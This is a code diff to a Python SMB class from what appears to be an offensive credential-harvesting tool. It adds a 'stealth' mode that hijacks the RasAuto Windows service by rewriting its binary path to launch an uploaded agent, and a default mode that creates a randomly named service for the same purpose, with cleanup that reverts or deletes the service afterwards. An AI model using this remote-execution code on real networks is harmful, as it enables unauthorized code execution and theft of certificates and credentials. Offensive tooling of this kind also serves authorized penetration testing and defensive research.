@@ -20,11 +20,14 @@ class Smb:
         hashes=None,
         kerberos=None,
         aeskey=None,
+        stealth=False,
     ):
         self.__domain = domain
         self.__username = username
         self.__password = password
         self.__lmhash, self.__nthash = "", ""
+        self.__stealth = stealth
+
         if hashes:
             self.__lmhash, self.__nthash = hashes.split(":")
         self.__dc_target = dc_target
@@ -34,7 +37,6 @@ class Smb:
         self.__rpc_con = None
         self.__scmr_con = None
         self.__svc_handle = None
-        self.__svc_name = "RasAuto"
         self.__service = None
 
         self.__initial_binary_path = None
@@ -85,12 +87,21 @@ class Smb:
                 logger.error(f"Fail to upload the agent ({str(e)})")
             raise Exception
         try:
+            self.__command = f'{self.__masky_remote_path} /ca:"{ca}" /template:"{template}" /output:"{self.__results_remote_path}" /debug:"{self.__errors_remote_path}"'
             self.__init_rpc(target)
             self.__init_scmr()
-            self.__edit_svc(ca, template)
-            logger.debug(f"The service '{self.__svc_name}' was successfuly modified")
+            if self.__stealth:
+                self.__edit_svc()
+                logger.debug(
+                    f"The service '{self.__svc_name}' was successfuly modified"
+                )
+            else:
+                self.__create_svc()
+                logger.debug(f"The service '{self.__svc_name}' was successfuly created")
         except Exception as e:
-            logger.error(f"Fail to edit the '{self.__svc_name}' service via DCERPC")
+            logger.error(
+                f"Fail to edit or create the '{self.__svc_name}' service via DCERPC"
+            )
             self.__clean(target)
             raise Exception
         try:
@@ -254,10 +265,11 @@ class Smb:
         self.__scmr_con.bind(scmr.MSRPC_UUID_SCMR)
         resp = scmr.hROpenSCManagerW(self.__scmr_con)
         self.__svc_handle = resp["lpScHandle"]
+
+    def __edit_svc(self):
+        self.__svc_name = "RasAuto"
         resp = scmr.hROpenServiceW(self.__scmr_con, self.__svc_handle, self.__svc_name)
         self.__service = resp["lpServiceHandle"]
-
-    def __edit_svc(self, ca, template):
         resp = scmr.hRQueryServiceConfigW(self.__scmr_con, self.__service)
         self.__initial_binary_path = resp["lpServiceConfig"]["lpBinaryPathName"]
         self.__initial_start_type = resp["lpServiceConfig"]["dwStartType"]
@@ -271,7 +283,7 @@ class Smb:
             scmr.SERVICE_NO_CHANGE,
             scmr.SERVICE_DEMAND_START,
             scmr.SERVICE_ERROR_IGNORE,
-            f'{self.__masky_remote_path} /ca:"{ca}" /template:"{template}" /output:"{self.__results_remote_path}" /debug:"{self.__errors_remote_path}"',
+            self.__command,
             NULL,
             NULL,
             NULL,
@@ -281,6 +293,18 @@ class Smb:
             NULL,
             NULL,
         )
+
+    def __create_svc(self):
+        self.__svc_name = "".join(random.choices(string.ascii_lowercase, k=8))
+        resp = scmr.hRCreateServiceW(
+            self.__scmr_con,
+            self.__svc_handle,
+            self.__svc_name,
+            self.__svc_name,
+            lpBinaryPathName=self.__command,
+            dwStartType=scmr.SERVICE_DEMAND_START,
+        )
+        self.__service = resp["lpServiceHandle"]
 
     def __revert_svc(self):
         try:
@@ -308,19 +332,37 @@ class Smb:
                 f"Fail to revert '{self.__svc_name}' service binary path ({str(e)}])"
             )
 
+    def __remove_svc(self):
+        try:
+            scmr.hRDeleteService(self.__scmr_con, self.__service)
+            scmr.hRCloseServiceHandle(self.__scmr_con, self.__service)
+            logger.debug(
+                f"The '{self.__svc_name}' service binary path has been removed"
+            )
+        except Exception as e:
+            logger.warn(
+                f"Fail to remove '{self.__svc_name}' service binary path ({str(e)}])"
+            )
+
     def __clean(self, target_host):
         try:
-            self.__revert_svc()
+            if self.__stealth:
+                self.__revert_svc()
+            else:
+                self.__remove_svc()
         except:
             logger.warning(
-                f"An error occurred while trying to restore service {self.__svc_name}. Trying again..."
+                f"An error occurred while trying to restore or remove the service '{self.__svc_name}'. Trying again..."
             )
             try:
                 self.__init_scmr()
-                self.__revert_svc()
+                if self.__stealth:
+                    self.__revert_svc()
+                else:
+                    self.__remove_svc()
             except Exception as e:
                 logger.warning(
-                    f"An unknown error occured while trying to revert '{self.__svc__name}' ({str(e)})"
+                    f"An unknown error occured while trying to revert or remove '{self.__svc_name}' ({str(e)})"
                 )
         try:
             scmr.hRControlService(
